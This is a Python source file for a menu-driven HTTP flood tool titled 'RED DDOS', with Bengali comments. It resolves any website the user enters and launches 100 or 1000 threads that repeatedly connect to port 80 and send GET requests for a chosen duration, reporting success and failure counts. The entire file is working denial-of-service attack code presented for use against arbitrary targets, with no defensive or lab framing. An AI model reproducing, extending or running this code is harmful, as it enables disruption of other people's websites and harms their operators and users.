import os
import time
import random
import sys
import socket
import threading
from colorama import Fore, Style, init
from urllib.parse import urlparse

# কালার ইনিশিয়ালাইজ
init(autoreset=True)

# গ্লোবাল ভেরিয়েবল
target_url = "127.0.0.1"
target_port = 80
threads_count = 100
attack_duration = 60 
success_count = 0
failed_count = 0
is_attacking = False

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner():
    clear_screen()
    # আপনার চাওয়া স্টাইলের ASCII আর্ট (সংশোধিত)
    banner = """
██████╗ ███████╗██████╗     ██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██████╔╝█████╗  ██║  ██║    ██║  ██║██║  ██║██║   ██║███████╗
██╔══██╗██╔══╝  ██║  ██║    ██║  ██║██║  ██║██║   ██║╚════██║
██║  ██║███████╗██████╔╝    ██████╔╝██████╔╝╚██████╔╝███████║
╚═╝  ╚═╝╚══════╝╚═════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
    """
    print(Fore.CYAN + Style.BRIGHT + banner)
    print(Fore.MAGENTA + Style.BRIGHT + "             DEVELOPER BY SABBIR ØX")
    print(Fore.RED + "--------------------------------------------------------------")
    print("")

def show_menu():
    print(Fore.CYAN + f"[1] " + Fore.WHITE + f"TARGET WEBSITE  (Current: {target_url})")
    print(Fore.CYAN + f"[2] " + Fore.WHITE + f"MINI ATTACK     (Threads: 100)")
    print(Fore.CYAN + f"[3] " + Fore.WHITE + f"POWERFUL ATTACK (Threads: 1000)")
    print(Fore.CYAN + f"[4] " + Fore.WHITE + f"ATTACK TIME     (Current: {attack_duration}s)")
    print(Fore.GREEN + f"[5] " + Fore.WHITE + f"START ATTACK")
    print(Fore.RED + f"[6] " + Fore.WHITE + f"EXIT")
    print(Fore.RED + "--------------------------------------------------------------")

def attack_logic():
    global success_count, failed_count, is_attacking
    while is_attacking:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_url, target_port))
            request = f"GET / HTTP/1.1\r\nHost: {target_url}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n"
            s.send(request.encode())
            s.close()
            success_count += 1 
        except:
            failed_count += 1  
            pass

def start_attack():
    global success_count, failed_count, is_attacking, threads_count, attack_duration
    success_count = 0
    failed_count = 0
    is_attacking = True
    
    clear_screen()
    print(Fore.RED + "--------------------------------------------------------------")
    print(Fore.YELLOW + f"[*] Target   : " + Fore.WHITE + f"http://{target_url}:{target_port}")
    print(Fore.YELLOW + f"[*] Threads  : " + Fore.WHITE + f"{threads_count}")
    print(Fore.YELLOW + f"[*] Duration : " + Fore.WHITE + f"{attack_duration}s")
    print(Fore.RED + "--------------------------------------------------------------")
    
    for _ in range(threads_count):
        t = threading.Thread(target=attack_logic)
        t.daemon = True
        t.start()

    start_time = time.time()
    try:
        while time.time() - start_time < attack_duration:
            elapsed = int(time.time() - start_time)
            sys.stdout.write(f"\r{Fore.GREEN}Successful: {success_count} {Fore.RED}| Failed: {failed_count} {Fore.CYAN}| Active: {threads_count} {Fore.WHITE}| Time: {elapsed}s/{attack_duration}s ")
            sys.stdout.flush()
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
        
    is_attacking = False
    print(Fore.GREEN + "\n\n[✓] Attack Finished! Press Enter to return...")
    input()

def main():
    global target_url, target_port, threads_count, attack_duration
    
    while True:
        show_banner()
        show_menu()
        
        choice = input(Fore.YELLOW + "\nSelect an option: " + Fore.WHITE)
        
        if choice == '1':
            new_target = input(Fore.CYAN + "Enter Website URL (e.g., example.com or https://example.com): " + Fore.WHITE)
            if new_target:
                try:
                    if not new_target.startswith(('http://', 'https://')):
                        clean_url = new_target
                    else:
                        parsed = urlparse(new_target)
                        clean_url = parsed.netloc if parsed.netloc else parsed.path
                    
                    target_url = socket.gethostbyname(clean_url)
                    target_port = 80 
                    
                    print(Fore.GREEN + f"[✓] Target successfully set to IP: {target_url}")
                except Exception:
                    print(Fore.RED + "[!] Invalid Website URL or Could not resolve IP.")
                time.sleep(2)
                
        elif choice == '2':
            threads_count = 100
            print(Fore.GREEN + "[✓] Mini Attack Mode Selected (100 Threads)")
            time.sleep(1)
            
        elif choice == '3':
            threads_count = 1000
            print(Fore.RED + "[✓] Powerful Attack Mode Selected (1000 Threads)")
            time.sleep(1)
            
        elif choice == '4':
            try:
                time_input = int(input(Fore.CYAN + "Enter attack time in seconds (e.g., 30, 60): " + Fore.WHITE))
                attack_duration = time_input
                print(Fore.GREEN + f"[✓] Time set to {attack_duration} seconds")
            except:
                print(Fore.RED + "[!] Please enter a valid number.")
            time.sleep(1)
            
        elif choice == '5':
            start_attack()
            
        elif choice == '6':
            print(Fore.RED + "Exiting... Goodbye!")
            sys.exit()
        else:
            print(Fore.RED + "Invalid option!")
            time.sleep(1)

if __name__ == "__main__":
    main()
